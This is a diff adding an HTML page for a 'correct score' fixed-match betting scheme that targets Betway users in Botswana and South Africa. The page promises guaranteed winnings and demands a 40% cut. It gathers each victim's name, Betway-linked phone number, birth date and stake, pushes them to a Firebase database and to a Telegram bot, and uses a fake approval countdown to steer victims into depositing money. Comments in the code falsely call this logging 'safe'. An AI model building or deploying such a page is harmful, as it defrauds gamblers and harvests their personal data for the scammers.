@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sports Authority Center | Correct Score</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            background-color: #0a0a0a;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            background: #111;
+            min-height: 100vh;
+            box-shadow: 0 0 30px rgba(0,0,0,0.8);
+            overflow: hidden;
+        }
+
+        /* View Sections */
+        .view-section {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            min-height: 100vh;
+            width: 100%;
+            padding: 20px;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+            z-index: 1;
+        }
+
+        .view-section.active {
+            display: flex;
+            flex-direction: column;
+            opacity: 1;
+        }
+
+        /* Overlays for readability */
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: -1;
+        }
+
+        /* Typography */
+        h1 { font-size: 26px; font-weight: 800; color: #00ff00; margin-bottom: 10px; text-align: center; text-transform: uppercase; }
+        h2 { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #fff; text-align: center; }
+        p { font-size: 14px; line-height: 1.6; color: #ccc; margin-bottom: 15px; }
+
+        /* Buttons */
+        .btn {
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 800;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            text-transform: uppercase;
+            transition: 0.3s;
+            margin-top: auto;
+        }
+        .btn:hover { background-color: #00cc00; transform: scale(1.02); }
+
+        /* Landing Page specific */
+        .rules-box {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .rules-box h3 { color: #00ff00; margin-bottom: 10px; font-size: 16px;}
+        .rules-box ol { padding-left: 20px; font-size: 14px; color: #ddd; line-height: 1.6;}
+        .rules-box li { margin-bottom: 10px; }
+
+        /* Form Styles */
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; color: #aaa; margin-bottom: 5px; text-transform: uppercase; }
+        .form-group input { 
+            width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #333; 
+            background: rgba(255,255,255,0.1); color: #fff; font-size: 15px; outline: none; 
+        }
+        .form-group input:focus { border-color: #00ff00; }
+
+        /* Terms Box */
+        .terms-container {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid red;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            transition: 0.3s;
+        }
+        .terms-container.accepted {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+        }
+        .terms-container input[type="checkbox"] { margin-top: 3px; width: 18px; height: 18px; accent-color: #00ff00; cursor: pointer;}
+        .terms-text { font-size: 13px; color: red; font-weight: 600; transition: 0.3s;}
+        .terms-container.accepted .terms-text { color: #00ff00; }
+
+        /* Pending Page */
+        .pending-screen {
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .loader {
+            border: 5px solid #333;
+            border-top: 5px solid #00ff00;
+            border-radius: 50%;
+            width: 60px; height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .timer-big { font-size: 40px; font-weight: 800; color: #00ff00; margin: 15px 0;}
+
+        /* Final Page Links */
+        .link-btn {
+            display: block; text-align: center; background: #1a1a1a; color: #00ff00;
+            text-decoration: none; padding: 15px; border-radius: 8px; font-weight: 600;
+            border: 1px solid #333; margin-bottom: 10px; transition: 0.3s;
+        }
+        .link-btn:hover { background: #222; border-color: #00ff00; }
+        .link-btn i { margin-right: 10px; }
+
+        /* Toast */
+        .toast {
+            position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%);
+            background: #00ff00; color: #000; padding: 15px 25px; border-radius: 8px;
+            font-weight: 600; font-size: 14px; z-index: 9999; transition: bottom 0.4s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center;
+        }
+        .toast.show { bottom: 20px; }
+    </style>
+</head><body>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">Notification Message</div>
+
+    <div class="app-container">
+
+        <!-- PAGE 1: LANDING -->
+        <div id="page-landing" class="view-section active" style="background-image: url('images (1).jpeg');">
+            <div class="overlay"></div>
+            <h1>Sports Authority Center</h1>
+            <h2>Pure Correct Score Matches</h2>
+            <p style="text-align: center; color: #00ff00; font-weight: 600;">Odds are genuine and 100% winnings.</p>
+            
+            <div class="rules-box">
+                <h3>Terms & Conditions</h3>
+                <ol>
+                    <li>After winning, Customer is required to pay 40% of total won amount.</li>
+                    <li>Minimum stake is "500pula" or "R500".</li>
+                    <li>Ensure you have sufficient amount in your account before registration. Do not deposit any amount to BETWAY before successful registration.</li>
+                    <li>Ensure the number linked to BETWAY account is the number you are registering with.</li>
+                </ol>
+            </div>
+            
+            <p style="text-align: center; font-size: 12px; color: #ff9900;">Note: Ensure you are using the correct credentials.</p>
+            
+            <button class="btn" onclick="switchPage('page-register')">Proceed to Registration</button>
+        </div>
+
+        <!-- PAGE 2: REGISTRATION -->
+        <div id="page-register" class="view-section" style="background-image: url('images.png');">
+            <div class="overlay"></div>
+            <h1 style="font-size: 22px;">Betting Details</h1>
+            <p style="text-align: center; margin-bottom: 20px;">Payment after winning</p>
+
+            <form id="reg-form" onsubmit="submitRegistration(event)">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="reg-name" required placeholder="John Doe">
+                </div>
+                <div class="form-group">
+                    <label>Phone Number (Linked to Betway)</label>
+                    <input type="tel" id="reg-phone" required placeholder="e.g., +267 71234567">
+                </div>
+                <div class="form-group">
+                    <label>Date of Birth</label>
+                    <input type="date" id="reg-dob" required>
+                </div>
+                <div class="form-group">
+                    <label>Staking Amount</label>
+                    <input type="number" id="reg-stake" required min="500" placeholder="Minimum 500">
+                </div>
+
+                <div class="terms-container" id="terms-box" onclick="toggleTerms()">
+                    <input type="checkbox" id="terms-checkbox" onclick="event.stopPropagation(); toggleTerms();">
+                    <div class="terms-text">
+                        I agree to pay 40% of my total winnings to Sports Authority Center after successfully winning the correct score matches.
+                    </div>
+                </div>
+
+                <button type="submit" class="btn">Continue</button>
+            </form>
+        </div>
+
+        <!-- PAGE 3: PENDING -->
+        <div id="page-pending" class="view-section pending-screen" style="background-image: url('images.png');">
+            <div class="overlay"></div>
+            <div class="loader"></div>
+            <h1>Registration Pending</h1>
+            <p>Your registration is loading. Do not close this page until it is approved.</p>
+            <div class="timer-big" id="pending-timer">15:00</div>
+            <p style="font-size: 12px; color: #888;">Please wait for approval...</p>
+        </div>
+
+        <!-- PAGE 4: FINAL REDIRECT -->
+        <div id="page-final" class="view-section" style="background-image: url('betway-botswana-screenshot.png');">
+            <div class="overlay"></div>
+            <h1 style="color: #00ff00;">Congratulations!</h1>
+            <p style="text-align: center;">Now register or login to your Betway account and deposit the amount of stake you selected. It should not be less than 500.</p>
+            
+            <h2 style="font-size: 16px; margin-top: 20px; text-align: left;">Select your country website:</h2>
+            
+            <a href="https://www.betway.co.za/" target="_blank" class="link-btn">
+                <i class="fa-solid fa-globe"></i> Betway South Africa (R500)
+            </a>
+            <a href="https://www.betway.co.bw/" target="_blank" class="link-btn">
+                <i class="fa-solid fa-globe"></i> Betway Botswana (Pula)
+            </a>
+        </div>
+
+    </div>    <!-- JAVASCRIPT & FIREBASE -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // 1. Your Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyBEk04oVREFt_uGJ2drlodW5D-8OxGLGaE",
+            authDomain: "betway-correct-score-cen-a99c4.firebaseapp.com",
+            databaseURL: "https://betway-correct-score-cen-a99c4-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "betway-correct-score-cen-a99c4",
+            storageBucket: "betway-correct-score-cen-a99c4.firebasestorage.app",
+            messagingSenderId: "987134964745",
+            appId: "1:987134964745:web:b4872256f84d9c89b2b4d8",
+            measurementId: "G-XELLYBKP7D"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // 2. Telegram Bot Setup (Safe Logging Only)
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+        async function sendTelegramMsg(msg) {
+            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.error("TG Error", e); }
+        }
+
+        // 3. UI Logic
+        const toast = document.getElementById('toast');
+        let termsAccepted = false;
+        let pendingInterval;
+
+        window.switchPage = function(pageId) {
+            document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        }
+
+        window.showToast = function(message) {
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 4000);
+        }
+
+        window.toggleTerms = function() {
+            const box = document.getElementById('terms-box');
+            const checkbox = document.getElementById('terms-checkbox');
+            
+            termsAccepted = !termsAccepted;
+            checkbox.checked = termsAccepted;
+            
+            if (termsAccepted) {
+                box.classList.add('accepted');
+            } else {
+                box.classList.remove('accepted');
+            }
+        }
+
+        // 4. Form Submission & Firebase Logging
+        window.submitRegistration = async function(e) {
+            e.preventDefault();
+
+            if (!termsAccepted) {
+                showToast("You must accept the 40% terms to continue.");
+                return;
+            }
+
+            const name = document.getElementById('reg-name').value;
+            const phone = document.getElementById('reg-phone').value;
+            const dob = document.getElementById('reg-dob').value;
+            const stake = document.getElementById('reg-stake').value;
+
+            try {
+                // Log Safe Data to Firebase
+                await push(ref(db, 'registrations'), {
+                    fullName: name,
+                    phone: phone,
+                    dob: dob,
+                    stake: stake,
+                    termsAccepted: true,
+                    timestamp: Date.now()
+                });
+
+                // Log Safe Data to Telegram
+                const tgMsg = `
+🏆 <b>NEW REGISTRATION</b> 🏆
+━━━━━━━━━━━━━━━━━━
+👤 <b>Name:</b> ${name}
+📱 <b>Phone:</b> ${phone}
+🎂 <b>DOB:</b> ${dob}
+💰 <b>Stake:</b> ${stake}
+✅ <b>Terms:</b> Accepted (40% Cut)
+━━━━━━━━━━━━━━━━━━`;
+                sendTelegramMsg(tgMsg);
+
+                // Proceed to Pending Page
+                startPendingTimer();
+
+            } catch (error) {
+                console.error(error);
+                showToast("Connection error. Try again.");
+            }
+        }
+
+        // 5. Pending Timer (15 Minutes)
+        function startPendingTimer() {
+            switchPage('page-pending');
+            
+            let timeLeft = 15 * 60; // 15 minutes in seconds
+            const timerDisplay = document.getElementById('pending-timer');
+
+            clearInterval(pendingInterval);
+            pendingInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(pendingInterval);
+                    showToast("Your registration is approved!");
+                    setTimeout(() => switchPage('page-final'), 2000);
+                }
+                timeLeft--;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
